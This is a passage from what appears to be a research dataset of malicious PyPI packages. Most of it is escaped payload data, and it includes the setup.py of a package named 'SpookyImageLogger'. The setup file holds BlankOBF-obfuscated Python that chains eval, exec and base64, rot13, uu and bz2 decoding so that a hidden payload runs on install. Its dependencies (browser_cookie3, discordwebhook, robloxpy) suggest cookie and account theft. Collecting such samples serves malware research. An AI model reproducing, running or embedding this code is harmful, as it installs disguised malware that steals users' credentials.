5\\\\63\\\\66\\\\x34\\\\x34\\\\65\\\\65\\\\66\\\\65\\\\x34\\\\65\\\\66\\\\65\\\\x32\\\\64\\\\145\\\\x36\\\\x62\\\\x35\\\\x35\\\\63\\\\66\\\\x34\\\\143\\\\x36\\\\141\\\\63\\\\x35\\\\x34\\\\x31\\\\65\\\\63\\\\64\\\\x33\\\\65\\\\x61\\\\x36\\\\61\\\\65\\\\64\\\\x36\\\\x62\\\\x36\\\\x33\\\\63\\\\62\\\\x34\\\\146\\\\x35\\\\x33\\\\x33\\\\71\\\\65\\\\x61\\\\64\\\\142\\\\x35\\\\x34\\\\x34\\\\x64\\\\63\\\\x39\\\\x35\\\\66\\\\66\\\\x63\\\\66\\\\70\\\\65\\\\x61\\\\x35\\\\60\\\\67\\\\67\\\\x37\\\\60\\\\64\\\\x65\\\\x35\\\\61\\\\67\\\\71\\\\x35\\\\71\\\\x36\\\\x39\\\\x34\\\\x64\\\\65\\\\x33\\\\x33\\\\x34\\\\66\\\\x61\\\\64\\\\x62\\\\64\\\\x34\\\\x34\\\\71\\\\x36\\\\x64\\\\64\\\\x64\\\\x37\\\\x39\\\\x36\\\\70\\\\x34\\\\x66\\\\65\\\\x35\\\\x34\\\\66\\\\x34\\\\x65\\\\x36\\\\64\\\\64\\\\x66\\\\x35\\\\63\\\\64\\\\x39\\\\x33\\\\60\\\\65\\\\60\\\\64\\\\x35\\\\67\\\\x33\\\\62\\\\142\\\\x35\\\\70\\\\65\\\\x33\\\\66\\\\142\\\\66\\\\146\\\\x34\\\\x64\\\\x36\\\\x62\\\\67\\\\x30\\\\64\\\\144\\\\65\\\\67\\\\x35\\\\x35\\\\x37\\\\x33\\\\63\\\\x32\\\\x34\\\\71\\\\x34\\\\x36\\\\x34\\\\x65\\\\65\\\\141\\\\65\\\\x37\\\\x35\\\\x34\\\\x37\\\\x34\\\\x35\\\\x37\\\\x34\\\\144\\\\x35\\\\x34\\\\64\\\\62\\\\65\\\\65\\\\x35\\\\x32\\\\65\\\\x35\\\\x35\\\\x31\\\\66\\\\141\\\\65\\\\64\\\\65\\\\x35\\\\63\\\\64\\\\66\\\\142\\\\x35\\\\x36\\\\x34\\\\66\\\\x36\\\\70\\\\x34\\\\67\\\\x35\\\\70\\\\64\\\\66\\\\63\\\\x30\\\\x36\\\\143\\\\65\\\\70\\\\x34\\\\x34\\\\66\\\\63\\\\67\\\\x34\\\\x34\\\\x64\\\\x36\\\\x61\\\\67\\\\60\\\\x35\\\\x39\\\\x34\\\\x65\\\\64\\\\65\\\\x36\\\\x33\\\\67\\\\x36\\\\x34\\\\63\\\\x36\\\\142\\\\x33\\\\60\\\\66\\\\x37\\\\x35\\\\67\\\\x36\\\\x39\\\\x34\\\\71\\\\66\\\\70\\\\x35\\\\x33\\\\x35\\\\x36\\\\x36\\\\142\\\\67\\\\x39\\\\x35\\\\63\\\\66\\\\71\\\\66\\\\x66\\\\67\\\\x31\\\\65\\\\61\\\\65\\\\x35\\\\x33\\\\60\\\\x33\\\\x37\\\\x34\\\\x64\\\\x33\\\\x30\\\\64\\\\x64\\\\67\\\\x33\\\\x35\\\\x37\\\\65\\\\64\\\\x33\\\\71\\\\65\\\\65\\\\x35\\\\70\\\\65\\\\x33\\\\66\\\\64\\\\x35\\\\67\\\\65\\\\x31\\\\63\\\\60\\\\x33\\\\x35\\\\x35\\\\60\\\\65\\\\x31\\\\67\\\\x61\\\\x36\\\\x62\\\\66\\\\146\\\\x34\\\\x66\\\\67\\\\141\\\\66\\\\70\\\\x36\\\\x33\\\\64\\\\143\\\\x36\\\\142\\\\66\\\\x66\\\\63\\\\x38\\\\65\\\\70\\\\66\\\\143\\\\63\\\\65\\\\x34\\\\146\\\\64\\\\x39\\\\x36\\\\142\\\\63\\\\x31\\\\64\\\\x63\\\\65\\\\63\\\\x36\\\\x61\\\\x34\\\\x39\\\\63\\\\x31\\\\64\\\\142\\\\64\\\\x33\\\\x36\\\\x62\\\\67\\\\64\\\\x34\\\\141\\\\x37\\\\141\\\\x36\\\\67\\\\66\\\\x62\\\\64\\\\142\\\\65\\\\66\\\\64\\\\x39\\\\66\\\\145\\\\65\\\\x35\\\\x35\\\\63\\\\63\\\\64\\\\x37\\\\60\\\\65\\\\x34\\\\x36\\\\143\\\\65\\\\65\\\\x37\\\\x30\\\\65\\\\60\\\\64\\\\x35\\\\63\\\\60\\\\64\\\\x62\\\\65\\\\64\\\\65\\\\63\\\\67\\\\x38\\\\x35\\\\70\\\\64\\\\x65\\\\x34\\\\x36\\\\x33\\\\61\\\\x34\\\\x65\\\\x35\\\\66\\\\x33\\\\x30\\\\66\\\\63\\\\63\\\\x38\\\\x35\\\\x37\\\\x35\\\\x33\\\\x37\\\\67\\\\x37\\\\x37\\\\64\\\\x64\\\\x36\\\\x62\\\\64\\\\x64\\\\66\\\\144\\\\64\\\\142\\\\65\\\\x35\\\\65\\\\x31\\\\x37\\\\x35\\\\64\\\\x66\\\\x35\\\\x33\\\\x37\\\\70\\\\x35\\\\66\\\\x34\\\\141\\\\x34\\\\65\\\\x35\\\\61\\\\67\\\\71\\\\65\\\\70\\\\67\\\\x61\\\\x34\\\\62\\\\64\\\\x64\\\\65\\\\x30\\\\x36\\\\x63\\\\67\\\\60\\\\x34\\\\65\\\\64\\\\x62\\\\64\\\\66\\\\x35\\\\61\\\\x37\\\\x32\\\\x34\\\\145\\\\x37\\\\x39\\\\66\\\\x37\\\\67\\\\141\\\\x34\\\\x63\\\\x37\\\\x39\\\\63\\\\x34\\\\63\\\\x39\\\\x35\\\\66\\\\65\\\\x33\\\\x34\\\\145\\\\65\\\\x35\\\\65\\\\62\\\\65\\\\64\\\\x35\\\\65\\\\63\\\\60\\\\65\\\\x36\\\\x33\\\\x30\\\\x34\\\\145\\\\64\\\\143\\\\x34\\\\143\\\\64\\\\63\\\\x36\\\\70\\\\66\\\\66\\\\x34\\\\x61\\\\65\\\\65\\\\64\\\\x35\\\\67\\\\x35\\\\x35\\\\70\\\\x33\\\\60\\\\66\\\\67\\\\x37\\\\x39\\\\64\\\\145\\\\65\\\\64\\\\67\\\\x38\\\\64\\\\144\\\\x35\\\\x38\\\\x37\\\\x37\\\\67\\\\60\\\\64\\\\x65\\\\64\\\\71\\\\x36\\\\x63\\\\63\\\\x35\\\\x34\\\\x35\\\\65\\\\64\\\\66\\\\71\\\\67\\\\63\\\\63\\\\x39\\\\x35\\\\x32\\\\x33\\\\x30\\\\x34\\\\x36\\\\x34\\\\145\\\\64\\\\x61\\\\66\\\\x63\\\\63\\\\61\\\\x36\\\\x32\\\\x35\\\\x31\\\\x36\\\\143\\\\x36\\\\x63\\\\x35\\\\x38\\\\x35\\\\64\\\\x35\\\\65\\\\x35\\\\x61\\\\x36\\\\61\\\\65\\\\67\\\\x35\\\\64\\\\x36\\\\64\\\\x34\\\\x35\\\\x34\\\\142\\\\65\\\\x36\\\\63\\\\x35\\\\64\\\\145\\\\65\\\\65\\\\x33\\\\61\\\\66\\\\x63\\\\x34\\\\x31\\\\x34\\\\71\\\\x34\\\\66\\\\64\\\\141\\\\64\\\\61\\\\x34\\\\x61\\\\64\\\\65\\\\63\\\\61\\\\x36\\\\63\\\\x35\\\\63\\\\x34\\\\64\\\\63\\\\x34\\\\x33\\\\62\\\\x35\\\\64\\\\x34\\\\x35\\\\x34\\\\x31\\\\x36\\\\67\\\\x35\\\\x35\\\\x37\\\\71\\\\65\\\\71\\\\66\\\\141\\\\65\\\\60\\\\x35\\\\65\\\\63\\\\x35\\\\x35\\\\x30\\\\65\\\\67\\\\x35\\\\65\\\\66\\\\146\\\\67\\\\x33\\\\65\\\\70\\\\x34\\\\64\\\\67\\\\67\\\\x36\\\\x66\\\\64\\\\144\\\\x34\\\\x36\\\\x37\\\\x37\\\\x33\\\\x39\\\\64\\\\x64\\\\x35\\\\x34\\\\64\\\\x61\\\\x34\\\\61\\\\x35\\\\x37\\\\65\\\\x35\\\\x36\\\\x66\\\\67\\\\60\\\\x34\\\\x33\\\\x36\\\\142\\\\x33\\\\60\\\\66\\\\145\\\\x34\\\\x65\\\\x36\\\\x61\\\\64\\\\62\\\\64\\\\x65\\\\65\\\\x30\\\\x35\\\\x33\\\\64\\\\71\\\\66\\\\142\\\\150')\",\"\",_____.__name__));______________=_____(_______(\"\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\56\\144\\x65\\x63\\x6f\\144\\145(b'\\\\142\\\\x65\\\\147\\\\151\\\\156\\\\40\\\\x36\\\\66\\\\66\\\\x20\\\\74\\\\144\\\\x61\\\\164\\\\x61\\\\76\\\\12\\\\x4d\\\\66\\\\66\\\\125\\\\x36\\\\x3b\\\\x46\\\\x25\\\\x37\\\\x2d\\\\x26\\\\x3d\\\\56\\\\72\\\\x45\\\\104\\\\122\\\\62\\\\x34\\\\61\\\\130\\\\72\\\\125\\\\x45\\\\70\\\\x34\\\\x46\\\\101\\\\60\\\\x39\\\\127\\\\41\\\\x2e\\\\63\\\\x34\\\\65\\\\x36\\\\x32\\\\105\\\\55\\\\43\\\\x2d\\\\x27\\\\111\\\\x2a\\\\64\\\\124\\\\64\\\\x52\\\\x33\\\\66\\\\x49\\\\x4b\\\\76\\\\x44\\\\131\\\\112\\\\x30\\\\x45\\\\x21\\\\x37\\\\12\\\\x4d\\\\54\\\\45\\\\51\\\\55\\\\x36\\\\44\\\\55\\\\41\\\\x39\\\\125\\\\101\\\\x26\\\\x3b\\\\x26\\\\x31\\\\61\\\\x30\\\\x56\\\\x31\\\\x46\\\\x35\\\\46\\\\120\\\\x59\\\\66\\\\44\\\\x4c\\\\x51\\\\x39\\\\45\\\\101\\\\70\\\\72\\\\64\\\\71\\\\x46\\\\64\\\\66\\\\105\\\\x21\\\\x3a\\\\45\\\\x40\\\\121\\\\55\\\\x23\\\\55\\\\x35\\\\65\\\\103\\\\105\\\\65\\\\x32\\\\x34\\\\61\\\\41\\\\x2a\\\\x55\\\\x31\\\\x49\\\\x0a\\\\x4d\\\\55\\\\x34\\\\x35\\\\x37\\\\65\\\\104\\\\x24\\\\120\\\\63\\\\x56\\\\x51\\\\107\\\\71\\\\x54\\\\111\\\\x25\\\\64\\\\x44\\\\51\\\\43\\\\x3a\\\\x53\\\\x21\\\\x49\\\\x34\\\\103\\\\41\\\\117\\\\x2a\\\\x54\\\\125\\\\131\\\\73\\\\x57\\\\x2d\\\\61\\\\x3e\\\\x44\\\\x55\\\\x4c\\\\x33\\\\x27\\\\x49\\\\61\\\\72\\\\x45\\\\x35\\\\111\\\\76\\\\45\\\\71\\\\x2d\\\\x35\\\\x47\\\\54\\\\x50\\\\x35\\\\104\\\\x39\\\\x29\\\\12\\\\115\\\\55\\\\x25\\\\45\\\\63\\\\66\\\\x44\\\\45\\\\x38\\\\65\\\\x24\\\\71\\\\x2d\\\\64\\\\x55\\\\x38\\\\x55\\\\x31\\\\104\\\\x49\\\\x4c\\\\x35\\\\66\\\\101\\\\x33\\\\x3a\\\\x46\\\\x4d\\\\x4a\\\\x33\\\\x37\\\\111\\\\x2d\\\\76\\\\x44\\\\131\\\\64\\\\63\\\\x45\\\\65\\\\62\\\\54\\\\x26\\\\135\\\\107\\\\x32\\\\x34\\\\55\\\\x21\\\\71\\\\x54\\\\x45\\\\43\\\\x30\\\\x36\\\\75\\\\51\\\\x30\\\\124\\\\45\\\\107\\\\x0a\\\\x4d\\\\x32\\\\104\\\\65\\\\x4c\\\\x38\\\\x34\\\\125\\\\x4a\\\\63\\\\64\\\\115\\\\x34\\\\x35\\\\x25\\\\x25\\\\117\\\\x36\\\\45\\\\x2d\\\\62\\\\x32\\\\64\\\\x51\\\\43\\\\66\\\\104\\\\x25\\\\61\\\\76\\\\x36\\\\121\\\\x25\\\\65\\\\x36\\\\x45\\\\x57\\\\71\\\\x54\\\\x4d\\\\x26\\\\64\\\\x33\\\\61\\\\x2b\\\\61\\\\x44\\\\x25\\\\113\\\\x35\\\\66\\\\x49\\\\107\\\\75\\\\x34\\\\x51\\\\x25\\\\66\\\\x37\\\\111\\\\x2d\\\\x0a\\\\x4d\\\\76\\\\104\\\\x55\\\\x49\\\\x33\\\\125\\\\x2d\\\\x39\\\\x3d\\\\124\\\\x51\\\\43\\\\x32\\\\x37\\\\55\\\\55\\\\76\\\\x44\\\\x39\\\\41\\\\64\\\\67\\\\x45\\\\51\\\\72\\\\x44\\\\125\\\\x35\\\\73\\\\44\\\\x25\\\\51\\\\x30\\\\125\\\\x25\\\\x4b\\\\64\\\\66\\\\x49\\\\x22\\\\60\\\\x54\\\\x55\\\\43\\\\x30\\\\x36\\\\75\\\\x2a\\\\72\\\\x54\\\\x39\\\\51\\\\x32\\\\64\\\\55\\\\x2d\\\\75\\\\x55\\\\x39\\\\41\\\\x0a\\\\115\\\\x3c\\\\44\\\\x59\\\\x29\\\\x30\\\\x54\\\\45\\\\x47\\\\63\\\\45\\\\x2d\\\\x2e\\\\x35\\\\x44\\\\121\\\\63\\\\x2e\\\\46\\\\121\\\\x29\\\\65\\\\66\\\\x2c\\\\123\\\\62\\\\x57\\\\x48\\\\121\\\\x31\\\\65\\\\45\\\\44\\\\60\\\\x33\\\\75\\\\x30\\\\72\\\\104\\\\125\\\\x47\\\\62\\\\x35\\\\61\\\\61\\\\74\\\\45\\\\45\\\\114\\\\65\\\\x45\\\\55\\\\53\\\\76\\\\x47\\\\x41\\\\42\\\\63\\\\103\\\\x20\\\\x54\\\\12\\\\115\\\\55\\\\x44\\\\x45\\\\64\\\\63\\\\x33\\\\71\\\\x2d\\\\73\\\\46\\\\x3c\\\\130\\\\x35\\\\44\\\\x39\\\\127\\\\x3c\\\\45\\\\x31\\\\114\\\\x35\\\\x36\\\\x41\\\\63\\\\x2c\\\\x35\\\\x45\\\\x4d\\\\64\\\\44\\\\x39\\\\113\\\\x3a\\\\65\\\\x21\\\\114\\\\74\\\\x52\\\\115\\\\56\\\\x3b\\\\45\\\\64\\\\x56\\\\x32\\\\126\\\\121\\\\x2a\\\\66\\\\x34\\\\x2d\\\\113\\\\x2c\\\\64\\\\x3d\\\\x2c\\\\x3a\\\\66\\\\54\\\\127\\\\12\\\\x4d\\\\x33\\\\125\\\\x39\\\\x25\\\\x2d\\\\125\\\\x31\\\\x4a\\\\x2c\\\\x36\\\\x39\\\\x30\\\\x3e\\\\x45\\\\x29\\\\x36\\\\x34\\\\46\\\\115\\\\123\\\\73\\\\104\\\\x49\\\\x49\\\\63\\\\x45\\\\71\\\\x34\\\\61\\\\x34\\\\x35\\\\x49\\\\64\\\\x24\\\\x35\\\\104\\\\x31\\\\65\\\\x29\\\\113\\\\64\\\\104\\\\x3d\\\\x36\\\\x3b\\\\x27\\\\75\\\\126\\\\x34\\\\x45\\\\71\\\\130\\\\63\\\\124\\\\125\\\\132\\\\x2e\\\\65\\\\41\\\\x36\\\\12\\\\115\\\\x2c\\\\x24\\\\x59\\\\x32\\\\64\\\\104\\\\x2d\\\\107\\\\73\\\\125\\\\45\\\\x4a\\\\66\\\\x44\\\\65\\\\x2a\\\\72\\\\126\\\\101\\\\61\\\\64\\\\67\\\\x45\\\\x21\\\\53\\\\125\\\\51\\\\x4b\\\\x34\\\\105\\\\61\\\\x2b\\\\61\\\\64\\\\111\\\\50\\\\x32\\\\x34\\\\61\\\\x4f\\\\62\\\\x55\\\\61\\\\63\\\\71\\\\x57\\\\45\\\\x31\\\\x3a\\\\x54\\\\105\\\\111\\\\64\\\\127\\\\x49\\\\x36\\\\x31\\\\64\\\\x4d\\\\44\\\\x0a\\\\x22\\\\x3b\\\\127\\\\x44\\\\40\\\\12\\\\x20\\\\x0a\\\\145\\\\156\\\\144\\\\x0a\\\\165')\",\"\",_____.__name__));_______________=_____(_______(\"\\x73\\x74\\x72\\x2e\\x6a\\157\\x69\\x6e('', \\133\\137\\137\\137\\x5f\\x5f\\137\\137\\137\\137\\x5f\\x5f\\137\\x28\\x78\\51\\40\\146\\x6f\\162\\40\\x78\\x20\\151\\x6e\\40\\x5b\\137\\x5f\\137\\137\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\x5f\\137\\x2c\\x5f\\137\\x5f\\137\\137\\137\\137\\137\\137\\137\\x5f\\137\\137\\137\\137\\137\\54\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\x2c\\137\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\x5d\\135)\",\"\", _____.__name__));________(___________________(____.decode(____.decode(______.b64decode(_________(_______________)), \"\\165\\x75\"),\"\\x62\\x7a\\62\"),____________________)[_____(\"\\x46\\x61\\x6c\\x73\\x65\")])"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-spookyimagelogger",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='SpookyImageLogger', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n# Obfuscated with BlankOBF\n# https://github.com/Blank-c/BlankOBF\n_____=eval(\"\\x65\\x76\\x61\\154\");_______=_____(\"\\143\\157\\155\\x70\\x69\\154\\145\");______,____=_____(_______(\"\\x5f\\137\\x69\\x6d\\160\\157\\162\\x74\\x5f\\x5f\\50\\x27\\x62\\x61\\163\\145\\x36\\64\\47\\51\",\"\",_____.__name__)),_____(_______(\"\\x5f\\137\\151\\x6d\\160\\157\\162\\x74\\137\\137\\50\\x27\\x63\\x6f\\x64\\x65\\x63\\163\\47\\x29\",\"\",_____.__name__));____________________=_____(\"'\\40\\171\\105\\x6f\\x7a\\x38\\145\\x44'\");________,_________,__________,___________=_____(_______(\"\\145\\x78\\x65\\x63\",\"\",_____.__name__)),_____(_______(\"\\163\\x74\\162\\56\\145\\x6e\\x63\\x6f\\x64\\145\",\"\",_____.__name__)),_____(_______(\"\\151\\163\\x69\\156\\163\\x74\\141\\156\\x63\\145\",\"\",_____.__name__)),_____(_______(\"\\x62\\171\\x74\\145\\163\",\"\",_____.__name__))\ndef ___________________(__________, ___________):\n    __________=__________.decode()\n    _________=\"\"\n    if not ___________[False]==\"\\40\":\n        ___________=\"\\40\"+___________\n    for _ in range(_____(\"\\x6c\\x65\\156\\50\\137\\x5f\\x5f\\137\\x5f\\x5f\\x5f\\137\\x5f\\137\\x29\")):\n        _________+=_____(\"\\143\\150\\x72\\x28\\157\\162\\x64\\x28\\137\\137\\x5f\\137\\137\\137\\x5f\\137\\x5f\\137\\133\\137\\x5d\\x29\\x5e\\x6f\\162\\144\\50\\137\\137\\x5f\\137\\x5f\\137\\137\\137\\137\\137\\137\\x5b\\50\\x6c\\145\\156\\50\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\137\\51\\40\\55\\x20\\124\\162\\165\\145\\52\\x32\\x29\\x20\\x2b\\x20\\124\\162\\165\\x65\\135\\x29\\x29\")\n    return (_________,___________)\ndef ____________(_____________):\n    if(_____________[-True]!=_____(_______(\"'\\x63\\x5f\\137\\137\\x5f\\137\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x36\\163\\x35\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\137\\x5f\\x5f\\x36\\141\\162\\x64\\166\\70'[-True*4]\",\"\",_____.__name__))):_____________ = _________(_____________)\n    if not(__________(_____________, ___________)):_____________ = _____(_______(\"\\x5f\\x5f\\x5f\\137\\56\\x64\\145\\x63\\x6f\\144\\x65\\50\\x5f\\137\\x5f\\137\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\133\\72\\x2d\\x54\\x72\\x75\\x65\\x5d,'\\162\\x6f\\x74\\61\\x33')\",\"\",_____.__name__))\n    else:\n        if(_____________[-True]==_____(_______(\"b'\\x66\\x35\\x73\\x66\\163\\144\\x66\\141\\165\\x66\\70\\65'[-True*4]\",\"\", _____.__name__))):\n            _____________=_____(_______(\"\\x5f\\137\\x5f\\137\\x2e\\144\\x65\\x63\\x6f\\x64\\x65\\50\\137\\x5f\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\137\\137\\137\\133\\72\\55\\x54\\x72\\165\\145\\135,'\\165\\x75')\",\"\",_____.__name__))\n        elif (_____________[-True] ==_____(_______(\"b'\\x64\\x35\\163\\146\\x73\\x31\\x64\\x66\\x66\\150\\163\\x64\\x38'[-True*4]\",\"\", _____.__name__))):_____________=_____(_______(\"\\x5f\\137\\137\\x5f\\56\\144\\145\\143\\x6f\\x64\\145\\x28\\x5f\\x5f\\137\\137\\137\\137\\x5f\\x5f\\x5f\\x5f\\137\\x5f\\x5f\\133\\x3a\\x2d\\x54\\x72\\x75\\x65\\x5d,'\\x68\\145\\x78')\",\"\",_____.__name__))\n        else:_____________=_____(_______(\"\\137\\137\\137\\137\\x5f\\x5f\\x2e\\142\\70\\x35\\x64\\x65\\x63\\x6f\\144\\145\\50\\137\\137\\x5f\\x5f\\137\\137\\137\\137\\137\\137\\137\\137\\x5f\\133\\72\\x2d\\x54\\x72\\165\\145\\x5d\\51\",\"\",_____.__name__));_____________=_____(_______(\"\\137\\137\\137\\x5f\\x2e\\144\\x65\\x63\\x6f\\144\\x65\\50\\x5f\\137\\137\\x5f\\137\\137\\x5f\\137\\137\\137\\137\\x5f\\x5f, '\\x68\\x65\\170')\",\"\",_____.__name__))\n        _____________=_____(_______(\"\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\56\\144\\x65\\x63\\157\\144\\145\\x28\\x5f\\137\\137\\x5f\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\x29\",\"\",_____.__name__))\n    return _____________\n_________________=_____(_______(\"\\137\\x5f\\137\\137\\137\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\56\\144\\145\\143\\x6f\\144\\x65(b'\\\\110\\\\x38\\\\167\\\\117\\\\x64\\\\x47\\\\45\\\\53\\\\74\\\\x62\\\\107\\\\x26\\\\x56\\\\115\\\\x34\\\\x47\\\\46\\\\x4d\\\\x41\\\\60\\\\110\\\\x65\\\\157\\\\145\\\\66\\\\x48\\\\141\\\\x49\\\\x6b\\\\x34\\\\110\\\\x38\\\\x77\\\\117\\\\153\\\\110\\\\145\\\\157\\\\x62\\\\x6e\\\\x47\\\\46\\\\x4d\\\\x43\\\\146\\\\x48\\\\43\\\\163\\\\x79\\\\160\\\\110\\\\x38\\\\126\\\\x39\\\\x65\\\\110\\\\43\\\\60\\\\122\\\\x65\\\\x48\\\\x65\\\\x78\\\\x6e\\\\162\\\\x48\\\\x65\\\\x29\\\\x71\\\\x30\\\\x47\\\\143\\\\131\\\\x7a\\\\173\\\\110\\\\x23\\\\60\\\\120\\\\60\\\\x48\\\\145\\\\x78\\\\150\\\\x32\\\\x47\\\\x63\\\\131\\\\x77\\\\x56\\\\110\\\\x23\\\\x73\\\\50\\\\x44\\\\107\\\\55\\\\x35\\\\x53\\\\x30\\\\x48\\\\x38\\\\145\\\\71\\\\x68\\\\x47\\\\x2b\\\\173\\\\x4c\\\\140\\\\x47\\\\x26\\\\x34\\\\66\\\\x65\\\\107\\\\x26\\\\x65\\\\x4f\\\\151\\\\107\\\\46\\\\x44\\\\103\\\\145\\\\107\\\\x64\\\\64\\\\x37\\\\x30\\\\x48\\\\145\\\\170\\\\x65\\\\60\\\\107\\\\143\\\\x7a\\\\74\\\\x7d\\\\110\\\\x38\\\\167\\\\x58\\\\150\\\\x47\\\\x63\\\\53\\\\174\\\\x67\\\\x48\\\\x38\\\\x77\\\\x4c\\\\x65\\\\110\\\\x65\\\\x78\\\\x68\\\\155\\\\x48\\\\70\\\\x6e\\\\114\\\\143\\\\x48\\\\x23\\\\111\\\\x64\\\\x67\\\\x47\\\\46\\\\64\\\\x30\\\\x5a\\\\x48\\\\43\\\\x49\\\\144\\\\154\\\\x48\\\\x65\\\\x78\\\\x6b\\\\60\\\\110\\\\71\\\\x30\\\\x6a\\\\x66\\\\107\\\\46\\\\x33\\\\137\\\\x58\\\\107\\\\x25\\\\x5f\\\\77\\\\x7c\\\\110\\\\x38\\\\x6e\\\\x52\\\\154\\\\110\\\\x39\\\\x30\\\\x68\\\\x38\\\\x47\\\\x26\\\\126\\\\x46\\\\x66\\\\107\\\\x64\\\\64\\\\71\\\\x62\\\\x48\\\\x61\\\\122\\\\171\\\\x70\\\\110\\\\146\\\\61\\\\44\\\\70\\\\107\\\\46\\\\115\\\\71\\\\176\\\\110\\\\104\\\\116\\\\x53\\\\155\\\\x48\\\\x23\\\\x73\\\\x76\\\\152\\\\x47\\\\144\\\\115\\\\x4a\\\\64\\\\x48\\\\43\\\\x73\\\\172\\\\101\\\\107\\\\46\\\\x56\\\\111\\\\x64\\\\x48\\\\x61\\\\x52\\\\x76\\\\x6c\\\\107\\\\55\\\\116\\\\144\\\\x7e\\\\110\\\\x38\\\\x56\\\\66\\\\x61\\\\x47\\\\46\\\\x6e\\\\123\\\\x36\\\\110\\\\x38\\\\x6e\\\\117\\\\146\\\\110\\\\145\\\\x40\\\\x74\\\\160\\\\110\\\\70\\\\x6e\\\\x50\\\\x34\\\\107\\\\55\\\\x66\\\\x6e\\\\162\\\\110\\\\141\\\\71\\\\x6d\\\\x67\\\\x47\\\\55\\\\x57\\\\x68\\\\67\\\\110\\\\70\\\\167\\\\125\\\\x6c\\\\107\\\\46\\\\63\\\\x7d\\\\x32\\\\x48\\\\x38\\\\156\\\\120\\\\x33\\\\x47\\\\x64\\\\115\\\\112\\\\x33\\\\x47\\\\x26\\\\115\\\\x43\\\\x67\\\\x47\\\\x25\\\\x2b\\\\x3c\\\\x58\\\\x48\\\\43\\\\x73\\\\166\\\\146\\\\x47\\\\x63\\\\x71\\\\53\\\\x5a\\\\110\\\\43\\\\163\\\\x7a\\\\101\\\\107\\\\x25\\\\x5f\\\\x5f\\\\132\\\\110\\\\145\\\\x29\\\\161\\\\x31\\\\x48\\\\70\\\\x56\\\\67\\\\63\\\\110\\\\x61\\\\x52\\\\161\\\\x38\\\\x47\\\\x63\\\\x60\\\\x33\\\\143\\\\x48\\\\145\\\\x6f\\\\x68\\\\66\\\\110\\\\70\\\\x4d\\\\x33\\\\x5a\\\\110\\\\50\\\\x40\\\\152\\\\x7d\\\\x48\\\\x61\\\\111\\\\155\\\\x67\\\\110\\\\x38\\\\x6e\\\\111\\\\x67\\\\107\\\\55\\\\x4e\\\\145\\\\65\\\\110\\\\43\\\\163\\\\x28\\\\x39\\\\x48\\\\x21\\\\50\\\\106\\\\x66\\\\110\\\\70\\\\x56\\\\x46\\\\x65\\\\x48\\\\x65\\\\x78\\\\x6b\\\\61\\\\110\\\\43\\\\163\\\\46\\\\x71\\\\x48\\\\x38\\\\50\\\\130\\\\151\\\\110\\\\145\\\\x6f\\\\x65\\\\153\\\\x48\\\\70\\\\x3f\\\\x62\\\\x36\\\\107\\\\143\\\\x59\\\\x74\\\\132\\\\110\\\\x38\\\\103\\\\174\\\\142\\\\110\\\\70\\\\167\\\\x58\\\\145\\\\107\\\\55\\\\x4e\\\\142\\\\153\\\\110\\\\70\\\\x56\\\\x43\\\\x64\\\\110\\\\141\\\\x52\\\\x73\\\\x68\\\\x48\\\\145\\\\x78\\\\156\\\\x72\\\\x48\\\\43\\\\x30\\\\x50\\\\63\\\\x47\\\\x26\\\\x44\\\\63\\\\x5a\\\\x47\\\\143\\\\x2b\\\\174\\\\x61\\\\107\\\\46\\\\126\\\\x46\\\\152\\\\x48\\\\43\\\\x73\\\\171\\\\152\\\\x48\\\\x65\\\\170\\\\x64\\\\173\\\\110\\\\x23\\\\141\\\\160\\\\154\\\\x48\\\\x38\\\\x77\\\\x50\\\\x31\\\\110\\\\70\\\\77\\\\x64\\\\x6a\\\\107\\\\x26\\\\104\\\\x39\\\\151\\\\107\\\\46\\\\104\\\\66\\\\141\\\\x48\\\\x38\\\\126\\\\106\\\\151\\\\110\\\\43\\\\111\\\\x62\\\\x33\\\\107\\\\46\\\\126\\\\106\\\\152\\\\110\\\\43\\\\163\\\\x7a\\\\x36\\\\107\\\\143\\\\131\\\\x7a\\\\174\\\\x48\\\\132\\\\x65\\\\63\\\\147\\\\x47\\\\x63\\\\x59\\\\164\\\\136\\\\x48\\\\x38\\\\x56\\\\x39\\\\132\\\\107\\\\46\\\\64\\\\64\\\\61\\\\x48\\\\x38\\\\x43\\\\x7c\\\\x62\\\\107\\\\x26\\\\x4d\\\\x46\\\\152\\\\x48\\\\70\\\\x43\\\\x7c\\\\145\\\\x48\\\\x38\\\\x56\\\\x43\\\\x68\\\\x48\\\\x65\\\\x40\\\\167\\\\70\\\\107\\\\x26\\\\63\\\\x5f\\\\141\\\\x48\\\\x66\\\\x31\\\\172\\\\x6f\\\\x47\\\\x26\\\\x4d\\\\x46\\\\x6a\\\\110\\\\x5a\\\\167\\\\111\\\\x67\\\\110\\\\70\\\\156\\\\122\\\\147\\\\107\\\\x64\\\\64\\\\x39\\\\x63\\\\110\\\\x38\\\\167\\\\114\\\\141\\\\110\\\\41\\\\x3f\\\\x4c\\\\150\\\\110\\\\141\\\\x52\\\\171\\\\x71\\\\x47\\\\x26\\\\x65\\\\x4f\\\\x67\\\\110\\\\x38\\\\145\\\\114\\\\152\\\\x47\\\\144\\\\x56\\\\122\\\\x68\\\\110\\\\x28\\\\100\\\\x68\\\\x31\\\\110\\\\104\\\\116\\\\x56\\\\63\\\\107\\\\143\\